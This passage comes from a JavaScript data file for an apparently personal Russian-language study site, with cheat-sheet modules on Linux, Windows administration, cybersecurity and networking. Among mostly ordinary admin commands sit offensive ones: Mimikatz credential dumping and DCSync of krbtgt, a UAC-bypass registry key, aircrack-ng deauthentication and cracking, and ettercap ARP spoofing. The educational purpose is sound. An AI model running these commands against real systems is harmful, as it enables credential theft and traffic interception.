ps aux          # все процессы
htop            # мониторинг
kill -9 PID     # убить

# Сеть
ip a            # интерфейсы
ss -tulpn       # порты
ping host       # проверка
netstat -tulpn  # классика</code></pre>
                `
            },
            {
                title: '🐳 Docker на Linux',
                content: `
                    <h3>Установка Docker</h3>
                    <pre><code># Установка на Arch
sudo pacman -S docker docker-compose
sudo systemctl enable --now docker
sudo usermod -aG docker $USER</code></pre>
                    <h3>Основные команды</h3>
                    <pre><code>docker run -d --name web -p 80:80 nginx
docker ps -a
docker logs -f web
docker exec -it web sh
docker cp file.txt web:/tmp/
docker compose up -d</code></pre>
                `
            },
            {
                title: '🔐 Безопасность Linux',
                content: `
                    <h3>Базовая защита</h3>
                    <ul>
                        <li>Не работай под root — используй sudo</li>
                        <li>Закрывай ненужные порты (ufw, iptables/nftables)</li>
                        <li>SSH: отключи пароль, используй ключи, смени порт</li>
                        <li>Fail2ban — защита от брутфорса</li>
                        <li>Регулярные обновления: pacman -Syu / apt update && apt upgrade</li>
                        <li>Audit: auditd, lynis, rkhunter, chkrootkit</li>
                    </ul>
                    <pre><code># UFW
ufw default deny
ufw allow 22/tcp
ufw enable

# SSH加固
# /etc/ssh/sshd_config
Port 2222
PasswordAuthentication no
PermitRootLogin no</code></pre>
                `
            },
            {
                title: '📦 Arch Linux',
                content: `
                    <h3>Arch — мой основной</h3>
                    <ul>
                        <li><strong>pacman</strong> — менеджер пакетов</li>
                        <li><strong>yay/paru</strong> — AUR-хелперы</li>
                        <li><strong>Rolling release</strong> — всегда свежий софт</li>
                        <li><strong>Arch Wiki</strong> — лучшая документация в мире Linux</li>
                        <li><strong>AUR</strong> — тысячи пользовательских пакетов</li>
                    </ul>
                    <pre><code># pacman
pacman -Syu           # обновление
pacman -S package     # установка
pacman -Rns package   # удаление
pacman -Qe            # мои пакеты
pacman -Qdt           # сироты

# yay
yay -S package        # из AUR
yay -Syu              # обновление всего</code></pre>
                `
            },
            {
                title: '🏗️ Systemd',
                content: `
                    <h3>Systemd — инициализация</h3>
                    <pre><code># Управление сервисами
systemctl start nginx
systemctl enable --now nginx
systemctl status nginx
systemctl restart nginx
systemctl stop nginx

# Логи
journalctl -u nginx -f
journalctl --since "1 hour ago"
journalctl -xe</code></pre>
                    <h3>Создание своего сервиса</h3>
                    <pre><code># /etc/systemd/system/myapp.service
[Unit]
Description=My App
After=network.target

[Service]
Type=simple
User=radmir
WorkingDirectory=/opt/myapp
ExecStart=/usr/bin/python /opt/myapp/main.py
Restart=on-failure

[Install]
WantedBy=multi-user.target</code></pre>
                `
            },
            {
                title: '🐚 Zsh и Oh My Zsh',
                content: `
                    <h3>Настройка shell</h3>
                    <ul>
                        <li><strong>Zsh</strong> — улучшенный bash</li>
                        <li><strong>Oh My Zsh</strong> — фреймворк для zsh</li>
                        <li><strong>powerlevel10k</strong> — красивое приглашение</li>
                        <li><strong>zsh-autosuggestions</strong> — автоподсказки</li>
                        <li><strong>zsh-syntax-highlighting</strong> — подсветка</li>
                    </ul>
                    <pre><code># Установка
sudo pacman -S zsh
sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# Плагины
git clone https://github.com/zsh-users/zsh-autosuggestions \${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git \${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code></pre>
                `
            },
            {
                title: '🌐 Сеть в Linux',
                content: `
                    <h3>Сетевые утилиты</h3>
                    <pre><code># iproute2 (современный)
ip addr              # IP адреса
ip link              # интерфейсы
ip route             # таблица маршрутизации
ss -tulpn            # сокеты

# nmap (классика)
nmap -sV 192.168.1.1

# tcpdump
sudo tcpdump -i eth0 port 80 -w capture.pcap</code></pre>
                    <h3>Настройка сети</h3>
                    <pre><code># Wi-Fi через iwd
iwctl
station wlan0 connect SSID

# Статический IP
ip addr add 192.168.1.100/24 dev eth0
ip route add default via 192.168.1.1</code></pre>
                `
            },
            {
                title: '💾 Управление дисками',
                content: `
                    <h3>Диски и разделы</h3>
                    <pre><code># Просмотр дисков
lsblk          # дерево дисков
fdisk -l       # таблица разделов

# Монтирование
mount /dev/sda1 /mnt
umount /mnt

# Файловые системы
mkfs.ext4 /dev/sda1
mkfs.btrfs /dev/sda1

# LVM
pvcreate /dev/sda1
vgcreate vg0 /dev/sda1
lvcreate -L 10G vg0 -n lv_root</code></pre>
                `
            },
            {
                title: '🔄 Бэкапы',
                content: `
                    <h3>Стратегия бэкапов</h3>
                    <ul>
                        <li><strong>rsync</strong> — синхронизация файлов</li>
                        <li><strong>borgbackup</strong> — дедуплицированные бэкапы</li>
                        <li><strong>restic</strong> — шифрованные бэкапы в облако</li>
                        <li><strong>dd</strong> — посекторное копирование</li>
                        <li><strong>timeshift</strong> — системные снапшоты</li>
                    </ul>
                    <pre><code># rsync
rsync -avz --delete /source/ /backup/

# borg
borg init --encryption=repokey /backup
borg create /backup::archive-$(date +%Y%m%d) /source

# restic
restic init --repo /backup
restic backup /source</code></pre>
                `
            },
            {
                title: '🖥️ WM и DE',
                content: `
                    <h3>Оконные менеджеры</h3>
                    <ul>
                        <li><strong>i3wm</strong> — tile-based, минимализм</li>
                        <li><strong>Hyprland</strong> — Wayland, красивый, анимации</li>
                        <li><strong>Qtile</strong> — на Python, гибкий</li>
                        <li><strong>bspwm</strong> — binary space partitioning</li>
                        <li><strong>GNOME/KDE</strong> — полноценные DE</li>
                    </ul>
                    <p>Лично использую i3wm и Hyprland. Минимализм, скорость, полный контроль с клавиатуры.</p>
                `
            },
            {
                title: '📜 Логирование',
                content: `
                    <h3>Система логирования</h3>
                    <pre><code># journalctl
journalctl -xe                    # последние логи
journalctl -u nginx -f            # логи службы в реальном времени
journalctl --since "2024-01-01"   # с даты
journalctl -p err                 # только ошибки

# syslog (классика)
# /var/log/
syslog        # системные
kern.log      # ядро
auth.log      # авторизация</code></pre>
                `
            },
            {
                title: '🐧 Ядро Linux',
                content: `
                    <h3>Работа с ядром</h3>
                    <pre><code># Информация
uname -a            # версия ядра
cat /proc/cpuinfo   # процессор
cat /proc/meminfo   # память
lsmod               # модули ядра

# Модули
modprobe module_name   # загрузить
modprobe -r module_name # выгрузить
lsmod | grep module    # проверить</code></pre>
                    <h3>Параметры ядра</h3>
                    <pre><code># sysctl
sysctl -a                    # все параметры
sysctl net.ipv4.ip_forward=1 # включить forwarding

# /etc/sysctl.d/99-custom.conf
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728</code></pre>
                `
            },
            {
                title: '🔧 Тулинг',
                content: `
                    <h3>Must-have утилиты</h3>
                    <ul>
                        <li><strong>htop/btop</strong> — мониторинг процессов</li>
                        <li><strong>ranger/lf</strong> — файловые менеджеры в терминале</li>
                        <li><strong>neovim</strong> — редактор</li>
                        <li><strong>tmux</strong> — мультиплексор терминалов</li>
                        <li><strong>fzf</strong> — размытый поиск</li>
                        <li><strong>ripgrep (rg)</strong> — быстрый grep</li>
                        <li><strong>bat</strong> — cat с подсветкой</li>
                        <li><strong>duf/ncdu</strong> — анализ диска</li>
                    </ul>
                    <p>Установка одной командой: <code>pacman -S htop neovim tmux fzf ripgrep bat duf</code></p>
                `
            }
        ]
    },
    {
        id: 'windows',
        icon: '🪟',
        title: 'Windows',
        desc: 'PowerShell, AD, Group Policy, безопасность, администрирование, автоматизация, реестр.',
        count: '8',
        submodules: [
            {
                title: '🔧 PowerShell',
                content: `
                    <h3>PowerShell — must know</h3>
                    <pre><code># Информация о системе
Get-ComputerInfo

# Сеть
Get-NetTCPConnection
Test-NetConnection google.com
Resolve-DnsName google.com

# Процессы
Get-Process
Stop-Process -Name notepad

# Логи безопасности
Get-WinEvent -LogName Security -MaxEvents 50

# Скачать файл
Invoke-WebRequest -Uri url -OutFile file</code></pre>
                    <h3>PowerShell скриптинг</h3>
                    <pre><code># Собрать информацию
$computers = Get-Content computers.txt
foreach ($pc in $computers) {
    Get-WmiObject Win32_ComputerSystem -ComputerName $pc
}</code></pre>
                `
            },
            {
                title: '🏢 Active Directory',
                content: `
                    <h3>Основы AD</h3>
                    <ul>
                        <li><strong>Централизованное управление</strong> — пользователи, компьютеры, группы</li>
                        <li><strong>Group Policy Objects (GPO)</strong> — массовая настройка системы</li>
                        <li><strong>Kerberos</strong> — протокол аутентификации</li>
                        <li><strong>LDAP</strong> — протокол доступа к каталогу</li>
                        <li><strong>Domain Controller</strong> — главный сервер AD</li>
                    </ul>
                    <h3>AD через PowerShell</h3>
                    <pre><code># Установка модуля
Install-WindowsFeature RSAT-AD-PowerShell

# Поиск пользователей
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity "username" -Properties EmailAddress

# Поиск в AD
Get-ADComputer -Filter * | select Name</code></pre>
                `
            },
            {
                title: '🛡️ Безопасность Windows',
                content: `
                    <h3>Защита Windows</h3>
                    <ul>
                        <li><strong>BitLocker</strong> — шифрование диска (TPM + PIN)</li>
                        <li><strong>AppLocker</strong> — контроль приложений (белые списки)</li>
                        <li><strong>WDAG</strong> — Windows Defender Application Guard</li>
                        <li><strong>LAPS</strong> — управление локальными паролями админов</li>
                        <li><strong>Windows Firewall</strong> — сетевой экран с продвинутыми правилами</li>
                        <li><strong>Defender for Endpoint</strong> — EDR-решение</li>
                    </ul>
                `
            },
            {
                title: '🗄️ Реестр Windows',
                content: `
                    <h3>Работа с реестром</h3>
                    <pre><code># Чтение реестра
Get-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion"

# Изменение
Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name Wallpaper -Value "C:\\bg.jpg"

# Поиск
Get-ChildItem -Path HKLM:\\Software -Recurse | Where-Object { $_.Name -like "*virus*" }</code></pre>
                    <h3>Реестр для пентеста</h3>
                    <ul>
                        <li><strong>Autoruns</strong> — HKLM\Software\Microsoft\Windows\CurrentVersion\Run</li>
                        <li><strong>UAC bypass</strong> — HKCU\Software\Classes\ms-settings\shell\open\command</li>
                        <li><strong>Persistence</strong> — реестровые ключи автозапуска</li>
                    </ul>
                `
            },
            {
                title: '🌐 Windows Networking',
                content: `
                    <h3>Сетевые возможности</h3>
                    <pre><code># IP конфигурация
ipconfig /all

# DNS
nslookup example.com

# Трассировка
tracert google.com
pathping google.com

# ARP таблица
arp -a

# SMB
net use Z: \\\\server\\share
Get-SmbShare</code></pre>
                    <h3>Windows Firewall</h3>
                    <pre><code># Правила
New-NetFirewallRule -DisplayName "Allow 8080" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow

# Состояние
Get-NetFirewallProfile | Format-Table Name, Enabled</code></pre>
                `
            },
            {
                title: '📜 Логи Windows',
                content: `
                    <h3>Аудит и логи</h3>
                    <pre><code># Event Log
Get-WinEvent -LogName Security -MaxEvents 100
Get-WinEvent -FilterHashtable @{LogName="System"; Level=2}

# Свои логи
Write-EventLog -LogName Application -Source MyApp -EntryType Error -EventId 100 -Message "Error!"</code></pre>
                    <h3>Важные Event ID</h3>
                    <ul>
                        <li><strong>4624</strong> — успешный вход</li>
                        <li><strong>4625</strong> — неудачный вход</li>
                        <li><strong>4688</strong> — создание процесса</li>
                        <li><strong>4698</strong> — создание задачи планировщика</li>
                        <li><strong>4720</strong> — создание пользователя</li>
                    </ul>
                `
            },
            {
                title: '🛠️ Sysinternals',
                content: `
                    <h3>Набор утилит Sysinternals</h3>
                    <ul>
                        <li><strong>Process Explorer</strong> — продвинутый диспетчер задач</li>
                        <li><strong>Procmon</strong> — мониторинг процессов, файлов, реестра</li>
                        <li><strong>TCPView</strong> — сетевые соединения</li>
                        <li><strong>Autoruns</strong> — всё что запускается с системой</li>
                        <li><strong>PsExec</strong> — удалённое выполнение команд</li>
                        <li><strong>AccessChk</strong> — права доступа</li>
                    </ul>
                    <pre><code># Скачать набор
Invoke-WebRequest -Uri https://live.sysinternals.com/PsExec.exe -OutFile psexec.exe

# Удалённый запуск
psexec \\\\target -u user -p pass cmd</code></pre>
                `
            },
            {
                title: '🔍 Windows для пентеста',
                content: `
                    <h3>Атаки на Windows</h3>
                    <ul>
                        <li><strong>Pass-the-Hash</strong> — Mimikatz, impacket-secretsdump</li>
                        <li><strong>Kerberoasting</strong> — получение TGS керберос</li>
                        <li><strong>AS-REP Roasting</strong> — пользователи без pre-auth</li>
                        <li><strong>LLMNR/NBT-NS Poisoning</strong> — Responder</li>
                        <li><strong>DCSync</strong> — синхронизация DC (нужны права админа)</li>
                        <li><strong>SMB Relay</strong> — ретрансляция NTLM</li>
                    </ul>
                    <pre><code># Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt</code></pre>
                `
            }
        ]
    },
    {
        id: 'cyber',
        icon: '🛡️',
        title: 'Кибербезопасность',
        desc: 'Основы безопасности, шифрование, VPN, анонимность, защита данных, threat intel, EDR, реагирование.',
        count: '12',
        submodules: [
            {
                title: '🔐 База безопасности',
                content: `
                    <h3>Что делать обязательно</h3>
                    <ul>
                        <li><strong>2FA</strong> — везде, где можно. TOTP > SMS</li>
                        <li><strong>Менеджер паролей</strong> — Bitwarden, KeePass, 1Password</li>
                        <li><strong>Обновления</strong> — всегда вовремя, не откладывай</li>
                        <li><strong>Бэкапы</strong> — правило 3-2-1 (3 копии, 2 носителя, 1 офлайн)</li>
                        <li><strong>Шифрование</strong> — диски, переписка, файлы</li>
                    </ul>
                `
            },
            {
                title: '🔑 Шифрование',
                content: `
                    <h3>Виды шифрования</h3>
                    <ul>
                        <li><strong>Симметричное</strong> — AES-256, ChaCha20 (один ключ, быстро)</li>
                        <li><strong>Асимметричное</strong> — RSA-4096, ECC (публичный + приватный, медленно)</li>
                        <li><strong>Хэширование</strong> — SHA-256, bcrypt, argon2 (необратимо)</li>
                        <li><strong>Гибридное</strong> — TLS, GPG (симметричный ключ шифруется асимметрично)</li>
                    </ul>
                    <h3>GPG</h3>
                    <pre><code># Создать ключ
gpg --full-generate-key

# Зашифровать
gpg -e -r "Name" file.txt

# Расшифровать
gpg -d file.txt.gpg

# Подписать
gpg -s file.txt

# Экспорт публичного ключа
gpg --export -a "Name" > pubkey.asc</code></pre>
                `
            },
            {
                title: '🎭 Анонимность',
                content: `
                    <h3>Инструменты анонимности</h3>
                    <ul>
                        <li><strong>Tor</strong> — анонимный веб-сёрфинг (луковичная маршрутизация)</li>
                        <li><strong>VPN</strong> — шифрование + смена IP (выбирай no-logs)</li>
                        <li><strong>Tails OS</strong> — анонимная ОС, не оставляет следов</li>
                        <li><strong>Whonix</strong> — Gateway + Workstation, трафик через Tor</li>
                        <li><strong>ProtonMail / Tutanota</strong> — приватная почта с шифрованием</li>
                    </ul>
                    <h3>Метаданные</h3>
                    <p>Удаляй EXIF из фото перед публикаций: <code>exiftool -all= photo.jpg</code></p>
                `
            },
            {
                title: '📊 Threat Intelligence',
                content: `
                    <h3>Следи за угрозами</h3>
                    <ul>
                        <li><strong>MITRE ATT&CK</strong> — база тактик и техник (14 тактик, 200+ техник)</li>
                        <li><strong>CVE / NVD</strong> — уязвимости с CVSS score</li>
                        <li><strong>AlienVault OTX</strong> — threat feeds, pulses</li>
                        <li><strong>Shodan</strong> — мониторинг устройств (InternetDB)</li>
                        <li><strong>VirusTotal</strong> — анализ файлов и URL</li>
                        <li><strong>The Hacker News / BleepingComputer</strong> — новости</li>
                    </ul>
                `
            },
            {
                title: '📱 Безопасность мобильных',
                content: `
                    <h3>Мобильная безопасность</h3>
                    <ul>
                        <li><strong>iOS vs Android</strong> — iOS безопаснее, Android гибче</li>
                        <li><strong>Не ставь сомнительные APK</strong> — даже не на эмулятор</li>
                        <li><strong>Отключай ненужные разрешения</strong> — гео, микрофон, камера</li>
                        <li><strong>VPN на телефоне</strong> — WireGuard, OpenVPN</li>
                        <li><strong>AdGuard DNS</strong> — блокировка трекеров на уровне DNS</li>
                    </ul>
                `
            },
            {
                title: '🌐 Безопасность Wi-Fi',
                content: `
                    <h3>Защита Wi-Fi</h3>
                    <ul>
                        <li><strong>WPA3</strong> — используй его, если поддерживается</li>
                        <li><strong>WPA2-CCMP (AES)</strong> — минимум, никакого TKIP</li>
                        <li><strong>Скрытие SSID</strong> — не помогает, не парься</li>
                        <li><strong>MAC-фильтрация</strong> — тоже не защита (MAC легко меняется)</li>
                        <li><strong>Гостевая сеть</strong> — для гостей и IoT устройств</li>
                    </ul>
                    <h3>Атаки на Wi-Fi</h3>
                    <pre><code># Aircrack-ng (Kali)
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid MAC -w capture wlan0mon
sudo aireplay-ng -0 5 -a MAC wlan0mon
sudo aircrack-ng -w wordlist.txt capture-01.cap</code></pre>
                `
            },
            {
                title: '🔒 Управление паролями',
                content: `
                    <h3>Как хранить пароли</h3>
                    <ul>
                        <li><strong>Bitwarden</strong> — open source, облачный или self-hosted</li>
                        <li><strong>KeePassXC</strong> — локальное хранение, без облака</li>
                        <li><strong>1Password</strong> — платный, но удобный</li>
                        <li><strong>pass (password-store)</strong> — GPG + git, для терминала</li>
                    </ul>
                    <h3>Правила паролей</h3>
                    <ul>
                        <li>Каждый сервис — уникальный пароль</li>
                        <li>Длина 16+ символов</li>
                        <li>Используй парольную фразу (correct-horse-battery-staple)</li>
                        <li>Включи 2FA везде где можно</li>
                        <li>Меняй пароли только при компрометации</li>
                    </ul>
                `
            },
            {
                title: '📧 Безопасность email',
                content: `
                    <h3>Защита почты</h3>
                    <ul>
                        <li><strong>ProtonMail / Tutanota</strong> — шифрование end-to-end</li>
                        <li><strong>GPG</strong> — шифрование писем (неудобно, но безопасно)</li>
                        <li><strong>SPF, DKIM, DMARC</strong> — защита от подделки домена</li>
                        <li><strong>Алиасы</strong> — SimpleLogin, AnonAddy, Firefox Relay</li>
                    </ul>
                    <h3>Фишинг</h3>
                    <ul>
                        <li>Никогда не переходи по ссылкам из подозрительных писем</li>
                        <li>Проверяй отправителя (не только имя, а email)</li>
                        <li>Используй менеджер паролей — он не автозаполнит на фишинг-сайте</li>
                        <li>2FA спасает даже если пароль украли</li>
                    </ul>
                `
            },
            {
                title: '🛡️ EDR и AV',
                content: `
                    <h3>Endpoint Detection & Response</h3>
                    <ul>
                        <li><strong>Windows Defender</strong> — встроенный, неплохой (попробуй ASR Rules)</li>
                        <li><strong>CrowdStrike</strong> — топ EDR, облачный</li>
                        <li><strong>SentinelOne</strong> — автономный AI-EDR</li>
                        <li><strong>Wazuh</strong> — open source SIEM + EDR</li>
                        <li><strong>Velociraptor</strong> — DFIR + охота за угрозами</li>
                    </ul>
                    <p>Современные EDR детектят не сигнатуры, а поведение. Mimikatz, LSASS dump, process injection — всё это ловится.</p>
                `
            },
            {
                title: '🌐 DNS Security',
                content: `
                    <h3>Защита DNS</h3>
                    <ul>
                        <li><strong>DNSSEC</strong> — подпись DNS записей</li>
                        <li><strong>DNS over HTTPS (DoH)</strong> — шифрование DNS запросов</li>
                        <li><strong>DNS over TLS (DoT)</strong> — альтернатива DoH</li>
                        <li><strong>Pi-hole</strong> — блокировка рекламы и трекеров на DNS уровне</li>
                        <li><strong>AdGuard DNS</strong> — публичный DNS с фильтрацией</li>
                    </ul>
                    <pre><code># Pi-hole установка
curl -sSL https://install.pi-hole.net | bash

# AdGuard DNS (клиент)
nano /etc/resolv.conf
nameserver 94.140.14.14
nameserver 94.140.15.15</code></pre>
                `
            },
            {
                title: '📋 Compliance',
                content: `
                    <h3>Стандарты и регуляции</h3>
                    <ul>
                        <li><strong>GDPR</strong> — защита данных в EU</li>
                        <li><strong>PCI DSS</strong> — безопасность платежных карт</li>
                        <li><strong>ISO 27001</strong> — стандарт управления информационной безопасностью</li>
                        <li><strong>SOC 2</strong> — аудит для облачных сервисов</li>
                        <li><strong>152-ФЗ</strong> — персональные данные в РФ</li>
                    </ul>
                    <p>Compliance — это не про безопасность, а про соответствие. Но соответствие часто подразумевает безопасность.</p>
                `
            },
            {
                title: '🔄 Реагирование на инциденты',
                content: `
                    <h3>IR Framework (NIST)</h3>
                    <ol>
                        <li><strong>Preparation</strong> — подготовка, инструменты, контакты</li>
                        <li><strong>Detection & Analysis</strong> — обнаружение, анализ, триаж</li>
                        <li><strong>Containment</strong> — изоляция, чтобы не распространялось</li>
                        <li><strong>Eradication</strong> — удаление угрозы</li>
                        <li><strong>Recovery</strong> — восстановление из бэкапов</li>
                        <li><strong>Post-Mortem</strong> — разбор, выводы, улучшения</li>
                    </ol>
                    <h3>Полезные инструменты</h3>
                    <ul>
                        <li><strong>Volatility</strong> — анализ памяти (RAM dump)</li>
                        <li><strong>Autopsy / Sleuth Kit</strong> — форензика дисков</li>
                        <li><strong>Redline</strong> — сбор индикаторов компрометации</li>
                        <li><strong>YARA</strong> — правила для обнаружения малвари</li>
                    </ul>
                `
            }
        ]
    },
    {
        id: 'networks',
        icon: '🌐',
        title: 'Сети / Networking',
        desc: 'TCP/IP, DNS, HTTP, прокси, VPN, протоколы, маршрутизация, анализ трафика, сетевая безопасность.',
        count: '10',
        submodules: [
            {
                title: '📡 Основы TCP/IP',
                content: `
                    <h3>Модель TCP/IP</h3>
                    <ul>
                        <li><strong>Application</strong> — HTTP, FTP, DNS, SSH, SMTP</li>
                        <li><strong>Transport</strong> — TCP (надёжный), UDP (быстрый)</li>
                        <li><strong>Internet</strong> — IP, ICMP, ARP</li>
                        <li><strong>Link</strong> — Ethernet, Wi-Fi, PPP</li>
                    </ul>
                    <h3>Порты (основные)</h3>
                    <pre><code>21  — FTP
22  — SSH
23  — Telnet
25  — SMTP
53  — DNS
80  — HTTP
110 — POP3
143 — IMAP
443 — HTTPS
3306 — MySQL
3389 — RDP
5432 — PostgreSQL
6379 — Redis
8080 — HTTP-alt</code></pre>
                `
            },
            {
                title: '🔗 Прокси и VPN',
                content: `
                    <h3>Типы прокси</h3>
                    <ul>
                        <li><strong>HTTP прокси</strong> — только веб-трафик, понимает HTTP</li>
                        <li><strong>HTTPS прокси</strong> — CONNECT метод, туннелирует TLS</li>
                        <li><strong>SOCKS5</strong> — любой трафик (TCP, UDP), без анализа</li>
                        <li><strong>Transparent</strong> — прозрачный прокси (кеширующий)</li>
                    </ul>
                    <h3>VPN протоколы</h3>
                    <ul>
                        <li><strong>OpenVPN</strong> — стандарт, гибкий, TCP/UDP</li>
                        <li><strong>WireGuard</strong> — современный, быстрый (в ядре Linux)</li>
                        <li><strong>IKEv2/IPSec</strong> — мобильный, стабильный</li>
                        <li><strong>L2TP/IPSec</strong> — устаревший, медленный</li>
                    </ul>
                    <pre><code># WireGuard
# /etc/wireguard/wg0.conf
[Interface]
PrivateKey = xxx
Address = 10.0.0.2/24

[Peer]
PublicKey = yyy
Endpoint = server:51820
AllowedIPs = 0.0.0.0/0</code></pre>
                `
            },
            {
                title: '🔍 Анализ трафика',
                content: `
                    <h3>Инструменты</h3>
                    <ul>
                        <li><strong>Wireshark</strong> — графический анализ (фильтры, статистика)</li>
                        <li><strong>tcpdump</strong> — CLI-захват (лёгкий, везде)</li>
                        <li><strong>tshark</strong> — CLI WireShark (скрипты)</li>
                        <li><strong>ngrep</strong> — grep для сети</li>
                        <li><strong>nethogs</strong> — трафик по процессам</li>
                    </ul>
                    <pre><code># tcpdump
sudo tcpdump -i eth0 -n port 80
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -r capture.pcap -X

# Wireshark фильтры
http.request
ip.addr == 192.168.1.1
tcp.port == 443</code></pre>
                `
            },
            {
                title: '🌐 DNS',
                content: `
                    <h3>Как работает DNS</h3>
                    <ul>
                        <li><strong>Рекурсивный резолвер</strong> — 8.8.8.8, 1.1.1.1</li>
                        <li><strong>Authoritative</strong> — отвечает за зону</li>
                        <li><strong>Записи</strong> — A, AAAA, MX, CNAME, TXT, NS, SOA</li>
                    </ul>
                    <pre><code># DNS запросы
dig example.com ANY
nslookup example.com
host example.com

# DNS трассировка
dig +trace example.com

# Обратный поиск
dig -x 8.8.8.8</code></pre>
                    <h3>Типы DNS атак</h3>
                    <ul>
                        <li><strong>DNS Spoofing</strong> — подделка ответов DNS</li>
                        <li><strong>DNS Tunneling</strong> — передача данных через DNS</li>
                        <li><strong>DNS Rebinding</strong> — обход CORS</li>
                    </ul>
                `
            },
            {
                title: '📦 HTTP/HTTPS',
                content: `
                    <h3>HTTP протокол</h3>
                    <ul>
                        <li><strong>Методы</strong> — GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS</li>
                        <li><strong>Коды</strong> — 200 OK, 301 Moved, 403 Forbidden, 404 Not Found, 500 Server Error</li>
                        <li><strong>Заголовки</strong> — Content-Type, Authorization, Cookie, User-Agent, Referer</li>
                    </ul>
                    <pre><code># HTTP запрос вручную
echo -e "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" | nc example.com 80

# curl
curl -v https://example.com
curl -X POST -d "key=value" https://api.example.com
curl -H "Authorization: Bearer token" https://api.example.com</code></pre>
                    <h3>HTTPS (TLS)</h3>
                    <ul>
                        <li><strong>Handshake</strong> — ClientHello → ServerHello → Cert → KeyExchange → Done</li>
                        <li><strong>Версии</strong> — TLS 1.2 (безопасно), TLS 1.3 (быстро и безопасно)</li>
                        <li><strong>SSL</strong> — deprecated, не используй</li>
                    </ul>
                `
            },
            {
                title: '🔌 Сетевые устройства',
                content: `
                    <h3>Оборудование</h3>
                    <ul>
                        <li><strong>Hub</strong> — тупой повторитель (не используется)</li>
                        <li><strong>Switch</strong> — коммутатор L2 (MAC-адреса)</li>
                        <li><strong>Router</strong> — маршрутизатор L3 (IP-адреса)</li>
                        <li><strong>Firewall</strong> — фильтр трафика (L3-L7)</li>
                        <li><strong>Load Balancer</strong> — распределение нагрузки</li>
                        <li><strong>IDS/IPS</strong> — обнаружение/предотвращение вторжений</li>
                    </ul>
                `
            },
            {
                title: '📊 Мониторинг сети',
                content: `
                    <h3>Инструменты мониторинга</h3>
                    <ul>
                        <li><strong>Nagios/Icinga</strong> — классический мониторинг</li>
                        <li><strong>Zabbix</strong> — всё в одном, сложный</li>
                        <li><strong>Prometheus + Grafana</strong> — современный, метрики</li>
                        <li><strong>ELK Stack</strong> — логи (Elasticsearch, Logstash, Kibana)</li>
                        <li><strong>Netdata</strong> — real-time, красиво</li>
                    </ul>
                    <pre><code># Netdata
bash <(curl -Ss https://my-netdata.io/kickstart.sh)
# Панель на http://localhost:19999</code></pre>
                `
            },
            {
                title: '🔒 Сетевые атаки',
                content: `
                    <h3>Типы атак</h3>
                    <ul>
                        <li><strong>MITM (Man-in-the-Middle)</strong> — перехват трафика</li>
                        <li><strong>ARP Spoofing</strong> — подмена ARP таблицы</li>
                        <li><strong>DNS Spoofing</strong> — подделка DNS ответов</li>
                        <li><strong>SYN Flood</strong> — DoS на TCP handshake</li>
                        <li><strong>Smurf Attack</strong> — ICMP amplification</li>
                    </ul>
                    <pre><code># ARP Spoofing (Ettercap)
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# ARP таблица
arp -a

# Статический ARP (защита)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF</code></pre>
                `
            },
            {
                title: '🌍 Маршрутизация',
                content: `
                    <h3>Основы маршрутизации</h3>
                    <ul>
                        <li><strong>Статическая</strong> — ручные маршруты (ip route add)</li>
                        <li><strong>Динамическая</strong> — BGP (Internet), OSPF (внутри AS)</li>
                        <li><strong>NAT</strong> — трансляция адресов (1 публичный → N внутренних)</li>
                    </ul>
                    <pre><code># Таблица маршрутизации
ip route
route -n

# Добавить маршрут
ip route add 10.0.0.0/24 via 192.168.1.1 dev eth0

# NAT (iptables)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre>
                `
            },
            {
                title: '📡 Беспроводные сети',
                content: `
                    <h3>Wi-Fi стандарты</h3>
                    <ul>
                        <li><strong>802.11ax (Wi-Fi 6)</strong> — современный, OFDMA</li>
                        <li><strong>802.11ac (Wi-Fi 5)</strong> — предыдущий стандарт</li>
                        <li><strong>802.11n (Wi-Fi 4)</strong> — старый, но везде</li>
                        <li><strong>5 GHz vs 2.4 GHz</strong> — скорость vs дальность</li>
                    </ul>
                    <h3>Безопасность Wi-Fi</h3>
                    <ul>
                        <li><strong>WPA3</strong> — SAE handshake, защита от dictionary атак</li>
                        <li><strong>WPA2-CCMP</strong> — AES, минимальный стандарт</li>
                        <li><strong>WEP</strong> — сломан, не использовать</li>
                    </ul>
                `
            }
        ]
    },
    {
        id: 'tools',
        icon: '🔧',
        title: 'Инструменты',
        desc: 'Полезные утилиты, тулы для OSINT/пентеста, конфигурация окружения, автоматизация, анализ.',
        count: '9',
        submodules: [
            {
                title: '💻 Терминал',
                content: `
                    <h3>Мой стек</h3>
                    <ul>
                        <li><strong>Kitty / Alacritty</strong> — терминалы (GPU-ускорение)</li>
                        <li><strong>tmux</strong> — мультиплексор (сессии, окна, панели)</li>
                        <li><strong>neovim</strong> — редактор (с LSP, treesitter)</li>
                        <li><strong>fzf</strong> — размытый поиск (Ctrl+R, Ctrl+T)</li>
                        <li><strong>ripgrep (rg)</strong> — быстрый grep</li>
                        <li><strong>bat</strong> — cat с подсветкой синтаксиса</li>
                        <li><strong>lsd/eza</strong> — ls с иконками и цветами</li>
                    </ul>
                `
            },
            {
                title: '🐙 Git',
                content: `
                    <h3>Команды Git</h3>
                    <pre><code>git init
git clone <url>
git add .
git commit -m "message"
git push origin main
git pull
git log --oneline --graph --all
git diff
git stash
git checkout -b feature
git merge feature
git rebase -i HEAD~3
git blame file.py</code></pre>
                    <h3>Git Workflow</h3>
                    <ul>
                        <li>main — стабильный код</li>
                        <li>develop — разработка</li>
                        <li>feature/* — новые фичи</li>
